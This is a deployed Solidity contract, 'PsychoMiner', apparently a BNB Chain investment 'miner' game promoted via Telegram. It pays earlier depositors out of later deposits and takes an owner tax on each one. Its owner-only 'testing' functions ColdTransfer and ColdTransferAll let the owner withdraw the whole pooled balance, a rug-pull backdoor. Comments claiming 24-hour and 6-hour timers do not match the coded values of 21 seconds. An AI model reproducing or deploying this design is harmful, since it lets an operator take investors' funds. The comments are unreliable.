/**
 *Submitted for verification at BscScan.com on 2022-06-29
*/

/*
PsychoMiner Contract
https://t.me/BatemanCasinoLounge
@PatrickBasedman_VP
*/
pragma solidity 0.8.8;
// SPDX-License-Identifier: Unlicensed

interface referralcontract
{
function CheckOwner() external returns(address);
function CheckRewardCA() external returns(address);
function CheckRefRef() external returns(address);
function CheckTelegram() external returns(string memory);
}

contract PsychoMiner{
modifier onlyOwner() {require(_owner == msg.sender, "Ownable: caller is not the owner");_;}
mapping (address => uint256) public TotalPaidIn;
mapping (address => uint256) public TotalPaidOut;
mapping (address => uint256) public LastInvestTimestamp;
mapping (address => uint256) public LastPayoutTimestamp;
uint256 PayoutCooldown = 21; // 24 Hours
uint256 PunishmentTime = 21; //6 Hours
address public _owner;
uint256 public MinimumInvestment = 1000000000000000;
uint256 public DevTax = 10;
uint256 public UniquePlayers;
uint256 public CurrentIndex = 0;
address[] public holders;
InvestLog[] public il;
PayoutLog[] public pl;
//EVENT LOG STRUCT ARRAY HERE, REFS ADD TO LOG TGLINK FROM ADDRESS PROBABLY
//ADD OLD PLAYERS FROM OLD ADDRESS FUNCTION
//IMPLEMENT GAS LIMIT FUNCTION ON PAYOUTS
receive() external payable {Invest(msg.value, msg.sender, address(0));}
fallback() external payable {Invest(msg.value, msg.sender, address(0));}
constructor(){_owner = msg.sender;}

struct InvestLog
{
address wallet;
uint256 amount;
bool reinvested;
address source;
uint256 time;
string TGLINK;
}

struct PayoutLog
{
address wallet;
uint256 amount; 
uint256 time;   
string TGLINK;
}

function AddToEventLogInvest(address wallet, uint256 amount, bool reinvested, address source, uint256 time, string memory TGLINK) internal{il.push(InvestLog(wallet, amount, reinvested, source, time, TGLINK));}

function AddToEventLogPayout(address wallet, uint256 amount, uint256 time, string memory TGLINK) internal{pl.push(PayoutLog(wallet, amount, time, TGLINK));}

function ReadStructInvestLog(uint256 i) public view returns(address wallet, uint256 amount, bool reinvested, address source, uint256 time, string memory TGLINK)
{
return(il[i].wallet, il[i].amount, il[i].reinvested, il[i].source, il[i].time, il[i].TGLINK);    
}

function ReadStructPayoutLog(uint256 i) public view returns(address wallet, uint256 amount, uint256 time, string memory TGLINK)
{
return(pl[i].wallet, pl[i].amount, pl[i].time, pl[i].TGLINK);    
}

function ReadUserTimes(uint256 i) public view returns(uint256 LastInvestTime, uint256 LastPayoutTime)
{
return (LastInvestTimestamp[holders[i]], LastPayoutTimestamp[holders[i]]);
}

function ReadTotalPaid(uint256 i) public view returns(uint256 TotalIn, uint256 TotalOut)
{
return (TotalPaidIn[holders[i]], TotalPaidOut[holders[i]]);
}

function FindUserIndex(address wallet) public view returns (uint256 i)
{
for(uint256 x = 0; x < holders.length; x++)
{
if(wallet == holders[x]){return x;} 
}
}

function GetLogLength() public view returns(uint256 ILog, uint256 PLog){return (il.length, pl.length);}
function GetTimeDifference(uint256 time) public view returns(uint256){return block.timestamp - time;}
function GetTimeTilNextPayout(address wallet) public view returns(uint256){if(GetTimeDifference(LastPayoutTimestamp[wallet]) > PayoutCooldown ){return 0;}else{return PayoutCooldown - GetTimeDifference(LastPayoutTimestamp[wallet]);}}
function GetTimeLeftToReinvest(address wallet) public view returns(uint256){if(GetTimeDifference(LastInvestTimestamp[wallet]) > PunishmentTime ){return 0;}else{return PunishmentTime - GetTimeDifference(LastInvestTimestamp[wallet]);}}
function GetPlayerStats() public view returns(uint256 unique, uint256 playing){return(UniquePlayers, holders.length);}

function MinerReferral(address from, address referral) public payable
{
Invest(msg.value, from, referral);    
} 

function InvestManual() public payable{Invest(msg.value, msg.sender, address(0));}

function Invest(uint256 value, address wallet, address referral) internal
{
address refowner = _owner;
address refref = address(0);
string memory TGLINK = "X";

if(referral != address(0))
{
try referralcontract(referral).CheckOwner() returns (address rs){ refowner = rs;} catch{refowner = _owner;}
try referralcontract(referral).CheckRefRef() returns (address rr){ refref = rr;} catch{refref = address(0);}
try referralcontract(referral).CheckTelegram() returns (string memory TG){ TGLINK = TG;} catch{TGLINK = "X";}
}

//PAY DEV TAX
if(referral == address(0)){if(payable(_owner).send(value/5)){}}
else
{
uint256 devp;
uint256 refownerp;
uint256 refrefp;
if(refref == address(0))
{
devp = value/8;
refownerp = value/10;
}
else
{
devp = value/10;
refownerp = value/10;
refrefp = value/30;
}
if(devp > 0){if(payable(_owner).send(devp)){}}
if(refownerp > 0){if(payable(refowner).send(refownerp)){}}
if(refrefp > 0){if(payable(refref).send(refrefp)){}}
}
//SORT TYPE OF ACTION
if(CheckIfHolder(wallet) == true){Reinvest(value, wallet, referral, TGLINK);}
else{NewInvestee(value, wallet, referral, TGLINK);}
//calculate payout for next user in line and self/ punishment here
ProcessHolders(wallet, TGLINK);
}

function NewInvestee(uint256 value, address wallet, address source, string memory TGLINK) internal
{
LastInvestTimestamp[wallet] = block.timestamp;
LastPayoutTimestamp[wallet] = block.timestamp;
TotalPaidIn[wallet] += value;
holders.push(wallet);
UniquePlayers += 1;
AddToEventLogInvest(wallet, value, false, source, block.timestamp, TGLINK);
}

function Reinvest(uint256 value, address wallet, address source, string memory TGLINK) internal
{
LastInvestTimestamp[wallet] = block.timestamp;
if(TotalPaidIn[wallet] < address(this).balance){TotalPaidIn[wallet] += value;}
AddToEventLogInvest(wallet, value, true, source, block.timestamp, TGLINK);
}

function ProcessHolders(address wallet, string memory TGLINK) internal
{
//PUNISHMENT CYCLE 2%
if(GetTimeLeftToReinvest(wallet) == 0 && GetTimeDifference(LastInvestTimestamp[wallet]) / PunishmentTime > 0){ TotalPaidIn[wallet] -= (TotalPaidIn[wallet] /50) * GetTimeDifference(LastInvestTimestamp[wallet]) / PunishmentTime;}
if(GetTimeTilNextPayout(wallet) == 0){PayoutUser(TotalPaidIn[wallet]/120, wallet, TGLINK);}

uint256 startGas = gasleft();
for(uint256 x = CurrentIndex; x < holders.length; x++)
{
if(x == holders.length - 1){CurrentIndex = x;}else{CurrentIndex = x;}
//PUNISHMENT CYCLE 2%
if(GetTimeLeftToReinvest(holders[x]) == 0 && GetTimeDifference(LastInvestTimestamp[holders[x]]) / PunishmentTime > 0){ TotalPaidIn[holders[x]] -= (TotalPaidIn[holders[x]] /50) * GetTimeDifference(LastInvestTimestamp[holders[x]]) / PunishmentTime;}
//REMOVE FROM LIST IF VALUE LESS THAN 0.001
if(TotalPaidIn[holders[x]] < MinimumInvestment){poparray(x);}
else
{
if(GetTimeTilNextPayout(holders[x]) == 0)
{
PayoutUser(TotalPaidIn[holders[x]]/120, holders[x], TGLINK);
}
}
//IF GAS LIMIT MET I = X;
if(startGas - gasleft() > 750000){break;}
}
}

function PayoutUser(uint256 value, address wallet, string memory TGLINK) internal
{
if(payable(wallet).send(value)){}
LastPayoutTimestamp[wallet] = block.timestamp;
TotalPaidOut[wallet] += value;
AddToEventLogPayout(wallet, value, block.timestamp, TGLINK);
}

function poparray(uint index) internal 
{
require(index < holders.length);
holders[index] = holders[holders.length-1];
holders.pop();
}

function CheckIfHolder(address wallet) view public returns (bool)
{
for(uint256 x = 0; x < holders.length; x++)
{
if(holders[x] == wallet){return true;}
}
return false;
}

//Testing only emergency transfer to recipient and or contract migrations.
function ColdTransfer(uint amount, address recipient) onlyOwner public{payable(recipient).transfer(amount);}
function ColdTransferAll(address recipient) onlyOwner public{payable(recipient).transfer(address(this).balance);}
}